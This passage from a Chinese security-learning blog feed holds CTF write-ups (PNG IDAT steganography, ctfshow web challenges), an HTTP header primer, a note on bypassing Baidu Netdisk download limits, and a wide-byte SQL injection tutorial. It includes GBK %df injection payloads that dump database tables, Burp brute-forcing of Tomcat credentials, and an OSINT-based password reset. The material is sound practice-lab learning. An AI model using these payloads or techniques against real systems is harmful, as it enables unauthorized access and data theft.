<p><img src="https://img.vim-cn.com/32/0bb40622510cc79d4473bc01cc97ac033e36d5.png" alt="misc10"></p>
<p>第一个文件打开就看到了flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对于这题八神师傅说过：</span><br><span class="line">zlib是PNG IDAT块数据可选的压缩格式</span><br><span class="line">本题是师傅自己生成了一段zlib压缩数据，然后加上长度位、标识位和CRC校验位</span><br><span class="line">伪装成一个IDAT块，然后插入到图片文件里</span><br><span class="line">binwalk会找到zlib块的标记然后提取出来，同时因为这是个压缩数据，-e参数会自动把提取到的压缩包尝试进行解压，所以最后的提取结果里就有了原始的文本--&gt;flag</span><br></pre></td></tr></table></figure>

<p>也可以解压最后一个idat块得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s=<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;789C4B2E492BCEC82FAF363635363235323132494C36B34C4E3233493333313637B3B030354C4C36B734A8050009960BD1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(zlib.decompress(s))</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------------------</span></span><br><span class="line"><span class="string">b&#x27;ctfshow&#123;353252424ac69cb64f643768851ac790&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="misc11"><a href="#misc11" class="headerlink" title="misc11"></a>misc11</h3><p>hint<code>flag在另一张图里</code> </p>
<p>讲真，这个hint没看懂，后来问了一下八神👴👴</p>
<p><img src="https://img.vim-cn.com/be/0560324992ad5c0a89854edd473ba53de933ea.png" alt="misc11.1"></p>
<p>用010打开👇</p>
<p><img src="https://img.vim-cn.com/8b/c96dec54ddad4bcf6d656f5aae09205d16234e.png" alt="misc11.2"></p>
<p>把第一个IDAT对应的部分删除之后保存为另一张图片即可看到flag</p>
<p>或者用tweakpng打开选中第二个idat块，右键点击delete删除，然后另存为一张图片即可</p>
<p><img src="https://img.vim-cn.com/af/4b6d14360e50ee54755174587a61af4a51a314.png" alt="misc11.3"></p>
<h3 id="misc12"><a href="#misc12" class="headerlink" title="misc12"></a>misc12</h3>]]></content>
      <categories>
        <category>Misc</category>
      </categories>
  </entry>
  <entry>
    <title>ctfshow_web入门  WP（未完）</title>
    <url>/2021/05/12/ctfshow_web_ru/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>打开按f12 或 右键空白处，查看网页源代码即可在注释中发现flag</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>题目hint：<code>js前台拦截 === 无效操作</code></p>
<p>发现无法用f12也无法用右键查看源代码</p>
<p>方法1、在浏览器的工具里选择开发者工具</p>
<p>方法2、在url前添上<code>view-source:</code></p>
<p>在源代码中即可发现flag</p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>题目hint：<code>没思路的时候抓个包看看，可能会有意外收获</code></p>
<p>用burpsuite抓包，发送到repeater模块，点击send看response即可发现flag</p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>题目hint:  <code>总有人把后台地址写入robots，帮黑阔大佬们引路。</code></p>
<p>涉及到一个知识点：robots.txt  <a href="https://baike.baidu.com/item/robots%E5%8D%8F%E8%AE%AE/2483797?fromtitle=robots.txt&fromid=9518761&fr=aladdin">有关知识</a></p>
<p>访问url+/robots.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;flagishere.txt</span><br></pre></td></tr></table></figure>

<p>接着访问url+/flagishere.txt 即可</p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>题目hint：<code>phps源码泄露有时候能帮上忙</code></p>
<p>访问url+/index.phps 下载源码</p>
<p>用记事本打开即可发现flag</p>
<p>相关知识：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">phps文件就是php的源代码文件，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容</span><br><span class="line">因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替</span><br></pre></td></tr></table></figure>

<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>题目hint：<code>解压源码到当前目录，测试正常，收工</code></p>
<p>还是考察代码泄露，访问url+/<a href="http://www.zip/">www.zip</a> 下载源码</p>
<p>打开index.php 提示flag在fl000g.txt中，可以看到压缩包里有个fl000g.txt，<del>but这个是个假flag</del></p>
<p>访问url+/fl000g.txt即可找到flag</p>
<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>题目hint：<code>版本控制很重要，但不要部署到生产环境更重要</code></p>
<p>考察.git源码泄露</p>
<p>访问url+/.git/即可</p>
<p>.开头的文件夹在linux下是隐藏文件，只是在终端操作的话看不到这个文件，会错误的将其部署到网站根目录下，造成了信息泄露</p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>hint与上题一样</p>
<p>考察.svn信息泄露</p>
<p>访问url+/.svn/即可</p>
<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>题目hint：<code>发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</code></p>
<p>考察vim缓存信息泄露</p>
<p>linux系统下使用vim编辑文件，会生成一个.swp文件，意外退出的话这个文件不会消失，结合题目hint，</p>
<p>访问url+/index.php.swp 下载并打开即可找到flag</p>
<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>题目hint：<code>cookie 只是一块饼干，不能存放任何隐私数据</code></p>
<p>打开浏览器开发人员工具(f12)，在application中找到cookie，里边就有flag</p>
<p>以chrome为例👇</p>
<p><img src="https://img.vim-cn.com/03/e60b27eb54d8ced045328cc1b35c3b99e68dec.png" alt="web10"></p>
<p>或者用burpsuite抓包也可  记得将%7B %7D转为{}</p>
<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>题目hint：<code>域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息</code></p>
<p>用域名解析查询<a href="http://dbcha.com/?t=1617279773">在线网站</a>输入ctfshow.com 查询txt即可</p>
<p><img src="https://img.vim-cn.com/79/dd3c6ce0274d792fd6a9d9573bb83a295c26db.png" alt="web11"></p>
<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>题目hint：<code>有时候网站上的公开信息，就是管理员常用密码</code></p>
<p>看到页面最下方有个Help Line Number : 372619038 猜测是密码</p>
<p>访问robots.txt 发现用户名为admin</p>
<p>访问url+/admin/会提示你输入用户名和密码</p>
<p>登录后发现flag</p>
<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>题目hint：<code>技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</code></p>
<p>技术文档，文档的英文是document，可以在products里边的最下边发现有个document，打开可以发现后台地址、用户名和密码。登陆进去就有flag</p>
<p>（后台地址为  url+/system1103/login.php</p>
<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>题目hint：<code>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</code></p>
<p>根据提示访问 url+/editor/</p>
<p><img src="https://img.vim-cn.com/14/a39cd61767361510e461a63f6d4618ed28922a.png" alt="web14.1"></p>
<p><img src="https://img.vim-cn.com/79/16002db4fcee3552c16ad9a2a751d507baed89.png" alt="web14.2"></p>
<p>在图片空间里找到flag所在位置（/var/www/html/nothinghere/fl000g.txt）</p>
<p>直接访问即可（url+/nothinghere/fl000g.txt</p>
<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p>题目hint：<code>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</code></p>
<p>在页面底部发现qq邮箱 <code>1156631961@qq.com</code></p>
<p>扫一下目录，发现后台界面为 url+/admin/</p>
<p>点击忘记密码 出现密保问题<code>我的所在地是哪个城市？</code></p>
<p>qq搜索刚刚那个qq号 发现所在地为 西安</p>
<p>输入后 提示 <code>您的密码已重置为admin7789</code></p>
<p>返回登陆界面 用户名admin 密码 admin7789</p>
<h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><p>题目hint：<code>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</code></p>
<p>hint里提到了探针，那就访问url+/tz.php</p>
<p>查看phpinfo，搜索ctfshow即可看到flag</p>
<h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p>题目hint：<code>透过重重缓存，查找到ctfer.com的真实IP，提交 flag&#123;IP地址&#125; </code></p>
<p>百度搜索fofa</p>
<p>搜索栏输入ctfer.com 可以看到<a href="http://www.ctfer.com的ip地址/">www.ctfer.com的ip地址</a> <code>111.231.70.44</code></p>
<p>按照要求提交即可</p>
<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p>题目hint：<code>不要着急，休息，休息一会儿，玩101分给你flag</code></p>
<p>打开是个flybird的小游戏</p>
<p>在Flappy_js.js中的判断部分发现一串Unicode编码👇</p>
<p><img src="https://img.vim-cn.com/9d/946c0c1a88edba41e5d5b7cccff2fe02973b44.png" alt="web18"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</span><br></pre></td></tr></table></figure>

<p>解码后为👇</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">你赢了，去幺幺零点皮爱吃皮看看</span><br><span class="line">去110.php看看</span><br></pre></td></tr></table></figure>

<p>直接访问url+/110.php 即可发现flag</p>
<h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><p>题目hint：<code>密钥什么的，就不要放在前端了</code></p>
<p>查看源码发现注释👇</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $flag&#x3D;&quot;fakeflag&quot;</span><br><span class="line">    $u &#x3D; $_POST[&#39;username&#39;];</span><br><span class="line">    $p &#x3D; $_POST[&#39;pazzword&#39;];</span><br><span class="line">    if(isset($u) &amp;&amp; isset($p))&#123;</span><br><span class="line">        if($u&#x3D;&#x3D;&#x3D;&#39;admin&#39; &amp;&amp; $p &#x3D;&#x3D;&#x3D;&#39;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#39;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    --&gt;</span><br></pre></td></tr></table></figure>

<p>尝试直接登陆，发现失败了</p>
<p>再看一下源代码，发现在前端有加密过程👇</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> key = <span class="string">&quot;0000000372619038&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> iv = <span class="string">&quot;ilove36dverymuch&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> pazzword = $(<span class="string">&quot;#pazzword&quot;</span>).val();</span><br><span class="line">    pazzword = encrypt(pazzword,key,iv);</span><br><span class="line">    $(<span class="string">&quot;#pazzword&quot;</span>).val(pazzword);</span><br><span class="line">    $(<span class="string">&quot;#loginForm&quot;</span>).submit();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params">data,key,iv</span>) </span>&#123; <span class="comment">//key,iv：16位的字符串</span></span><br><span class="line">    <span class="keyword">var</span> key1  = CryptoJS.enc.Latin1.parse(key);</span><br><span class="line">    <span class="keyword">var</span> iv1   = CryptoJS.enc.Latin1.parse(iv);</span><br><span class="line">    <span class="keyword">return</span> CryptoJS.AES.encrypt(data, key1,&#123;</span><br><span class="line">        iv : iv1,</span><br><span class="line">        mode : CryptoJS.mode.CBC,</span><br><span class="line">        padding : CryptoJS.pad.ZeroPadding</span><br><span class="line">    &#125;).toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>尝试用bp抓包👇</p>
<p><img src="https://img.vim-cn.com/8e/5b61bb9500f2a669660e1e12eefd7badadfcab.png" alt="web19.1"></p>
<p>可以看到密码已经被加密了，不再是输入的密码了</p>
<p>发送到repeater模块并修改密码再次发送</p>
<p><img src="https://img.vim-cn.com/df/ff750e75bf34d704a84ec0ab4e62f0f92714ea.png" alt="web19.2"></p>
<p>得到👇</p>
<p><img src="https://img.vim-cn.com/42/d71e5b9f932b6138796d23e7017830e00f8f63.png" alt="web19.3"></p>
<h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p>题目hint：<code>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加&#x2F;db&#x2F;db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开</span><br></pre></td></tr></table></figure>

<p>打开后搜索字符串ctfshow 即可找到flag</p>
<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p><code>考点tomcat 认证爆破之custom iterator使用</code></p>
<p>下载题目附件并打开，压缩包中有一个密码字典（待会用得上</p>
<p>打开网页后输入用户名和密码后用bp抓包👇</p>
<p><img src="https://img.vim-cn.com/e0/cd72ec4c36145781cdb617c6d577fee32c6c17.png" alt="web21.1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解码出来是</span><br><span class="line">admin:123</span><br><span class="line">用户名 冒号 密码</span><br></pre></td></tr></table></figure>

<p>认证成功返回的状态码是200，失败则是401</p>
<p>将该数据包发送到bp的爆破模块，选中base64编码后的用户名和密码</p>
<p>payload set-&gt;custom iterator(自定义迭代器)-&gt;position-&gt;输入字典</p>
<p>自定义迭代器可以自定义拼接方式，这里根据base64编码的tomcat密码的格式为 用户名+冒号+密码，所以position的位数为3</p>
<p><img src="https://img.vim-cn.com/f2/dbe11bf029841efb441620f7065989cef8235f.png" alt="position1"></p>
<p><img src="https://img.vim-cn.com/67/d43581be012518a50fa0b367f3b0a417cb8569.png" alt="position2"></p>
<p><img src="https://img.vim-cn.com/66/4bc79c2836dcca996da2f02670d16e863f7bb2.png" alt="position3"></p>
<p>三个位置都设置完成后需要进行base64编码👇</p>
<p><img src="https://img.vim-cn.com/c4/09e5ffb2bde78774308222681b2233e49e7aeb.png" alt="设置base64编码"></p>
<p>取消payload encoding编码👇</p>
<p><img src="https://img.vim-cn.com/a5/f4ade41f434573890040951bb738cd5462d87a.png" alt="取消payload encoding"></p>
<p>之后开始爆破就可以了</p>
<p>爆破成功👇</p>
<p><img src="https://img.vim-cn.com/4c/2d9559ede0838314bc7e5f5b64060e00790a7b.png" alt="success！"></p>
<h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><p>题目：<code>域名也可以爆破的，试试爆破这个**ctf**.show的子域名</code></p>
<p>hint：<a href="http://flag.ctfer.com/index.php">http://flag.ctfer.com/index.php</a></p>
<p>访问被拒绝了。。</p>
<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><p>题目：<code>还爆破？这么多代码，告辞！</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = md5(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

























































































































]]></content>
      <categories>
        <category>web刷题记录</category>
      </categories>
  </entry>
  <entry>
    <title>使用idm下载百度网盘文件</title>
    <url>/2021/05/25/idm/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>



<p>准备工作：idm、<a href="https://greasyfork.org/zh-CN/scripts/403991-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E9%93%BE%E6%8F%90%E5%8F%96-%E5%A4%9A%E9%80%89">Tampermonkey插件</a></p>
<h1 id="一、配置IDM"><a href="#一、配置IDM" class="headerlink" title="一、配置IDM"></a>一、配置IDM</h1><p>打开客户端 点击右上角下载，在弹出的选项中找到最下边的<code>选项</code>转到配置界面</p>
<p><img src="https://img.vim-cn.com/c5/fa6d5e4901cf31dd9313aeb236c7e832b7d049.png"></p>
<p>点击下载，修改用户代理为👇</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdisk;P2SP;2.2.60.26</span><br></pre></td></tr></table></figure>

<p>点击<code>确定</code>保存</p>
<p>点击连接</p>
<p><img src="https://img.vim-cn.com/89/8a4b17ee04e32945c5c0b5a199d039d111e6a6.png"></p>
<p>点新建，在弹出的窗口中输入<code>*.baidupcs.com</code>，前缀切换为<code>https://</code>修改最大连接数为2</p>
<p>点击<code>确定</code>保存</p>
<h1 id="二、安装油猴脚本"><a href="#二、安装油猴脚本" class="headerlink" title="二、安装油猴脚本"></a>二、安装油猴脚本</h1><p><a href="https://greasyfork.org/zh-CN/scripts/403991-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E9%93%BE%E6%8F%90%E5%8F%96-%E5%A4%9A%E9%80%89">Tampermonkey插件</a></p>
<h1 id="三、下载"><a href="#三、下载" class="headerlink" title="三、下载"></a>三、下载</h1><p><img src="https://img.vim-cn.com/90/8e9acd0ccc1faaefb29786432d994430a4baa9.png"></p>
<p>发现多了一个按钮，点击选择api下载即可自动弹出idm窗口（记得先打开idm</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
  </entry>
  <entry>
    <title>从0开始学web(一) http篇</title>
    <url>/2021/04/29/http/</url>
    <content><![CDATA[<p><font color=#999AAA >最近打算重新开始从头学web，简单记录一下</font></p>
<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>


<p><img src="https://img-blog.csdnimg.cn/20210326090723497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h1 id="关于CRLF"><a href="#关于CRLF" class="headerlink" title="关于CRLF"></a>关于CRLF</h1><p>CRLF是CR和LF两个字符的拼接，它们分别代表”回车+换行”（\r\n）“，全称为Carriage Return/Line Feed”，十六进制编码分别为0x0d和0x0a，URL编码为%0D和%0A。CR和LF组合在一起即CRLF命令，它表示键盘上的”Enter”键，许多应用程序和网络协议使用这些命令作为分隔符。</p>
<p>有关CRLF注入攻击的相关知识随后再做记录</p>
<p>crlf注入【<a href="https://baike.baidu.com/item/CRLF%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/14696969?fr=aladdin">百度百科</a>】</p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h1 id="HTTP头"><a href="#HTTP头" class="headerlink" title="HTTP头"></a>HTTP头</h1><p>有关http的详细内容【<a href="https://www.runoob.com/http/http-tutorial.html">传送门</a>】<br><img src="https://img-blog.csdnimg.cn/20210327124144706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><p> HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h2 id="XFF"><a href="#XFF" class="headerlink" title="XFF"></a>XFF</h2><p>X-Forwarded-For:<br>简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。标准格式如下：X-Forwarded-For: client1, proxy1, proxy2。最左边(client1)是最原始客户端的IP地址, 代理服务器每成功收到一个请求，就把请求来源IP地址添加到右边。</p>
<p>如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，ip分别为 ip1、ip2、ip3，用户真实 ip 为 ip0，那么按照 XFF 标准，服务端最终会收到这样信息：X-Forwarded-For: ip0, ip1, ip2</p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h2 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h2><p>User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。</p>
<p>User-Agent通常格式：</p>
<pre><code>Mozilla/5.0 (平台) 引擎版本 浏览器版本号
</code></pre>
<p><a href="http://www.mybatis.cn/archives/1238.html">User-Agent的伪造</a></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>Cookie，有时也用其复数形式 Cookies。类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息。存储在你电脑上的cookies就好比一张身份凭证或者一把钥匙。</p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">


<h2 id="有关xff及referer伪造"><a href="#有关xff及referer伪造" class="headerlink" title="有关xff及referer伪造"></a>有关xff及referer伪造</h2><p>题目：攻防世界  xff_referer  【<a href="https://adworld.xctf.org.cn/">传送门</a>】<br><font color=#999AAA >WP在这里就不写了，有困难自行百度</font></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h1 id="http响应码"><a href="#http响应码" class="headerlink" title="http响应码"></a>http响应码</h1><p>详细内容【<a href="https://www.runoob.com/http/http-status-codes.html">传送门</a>】</p>
]]></content>
      <categories>
        <category>web学习</category>
      </categories>
  </entry>
  <entry>
    <title>宽字节注入</title>
    <url>/2021/05/18/kuan/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>


<h1 id="一、什么是宽字节注入？"><a href="#一、什么是宽字节注入？" class="headerlink" title="一、什么是宽字节注入？"></a>一、什么是宽字节注入？</h1><p><img src="https://img-blog.csdnimg.cn/20210113171352374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210113171400407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210113171412165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="二、练习"><a href="#二、练习" class="headerlink" title="二、练习"></a>二、练习</h1><h2 id="题目链接："><a href="#题目链接：" class="headerlink" title="题目链接："></a>题目链接：</h2><p><a href="http://chinalover.sinaapp.com/SQL-GBK/">http://chinalover.sinaapp.com/SQL-GBK/</a></p>
<p>sqli-labs 第32关(没有搭建的话可以去<a href="https://buuoj.cn/challenges#sqli-labs">buuctf找basic中的sqli-labs</a>)[这个可以配合理解，自行操作效果极佳]</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><img src="https://img-blog.csdnimg.cn/20210113172133600.png" alt="在这里插入图片描述"><br>随便输个id<br><img src="https://img-blog.csdnimg.cn/20210113172209227.png" alt="在这里插入图片描述"><br>尝试用单引号闭合<br><img src="https://img-blog.csdnimg.cn/20210113172237782.png" alt="在这里插入图片描述"><br>发现‘ ‘ ’(单引号)转变成了‘ \‘ ’(反斜杠+单引号)<br>那就结合今天所学知识进行操作<br>首先利用order by 语句进行查询</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 order by 1%23</span><br></pre></td></tr></table></figure>
<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172707300.png" alt="![在这里插入图片描述](https://img-blog.csdnimg.cn/20210113172529680.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 order by 2%23</span><br></pre></td></tr></table></figure>
<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172651674.png" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 order by 3%23</span><br></pre></td></tr></table></figure>
<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172637974.png" alt="在这里插入图片描述"><br>3的话出现报错说明只有2个字段</p>
<p>接着利用union select语句查询数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 union select 1,database()%23</span><br></pre></td></tr></table></figure>
<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172929536.png" alt="在这里插入图片描述"><br>有了数据库名之后接着往下查</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23</span><br></pre></td></tr></table></figure>

<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113173125851.png" alt="在这里插入图片描述"><br>接着查ctf4（其余几个有兴趣也可以查一下看看，给出ctf4是因为里边有flag）</p>
<p>这里给ctf4转为了16进制（记得在前边加上0x）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name&#x3D;0x63746634%23</span><br></pre></td></tr></table></figure>
<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113173544299.png" alt="在这里插入图片描述"><br>看到了flag<br>继续查</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27%20union%20select%201,group_concat(flag)%20from ctf4%23</span><br></pre></td></tr></table></figure>
<p>也可以这样查</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27%20union select 1,(select flag from ctf4)%23</span><br></pre></td></tr></table></figure>
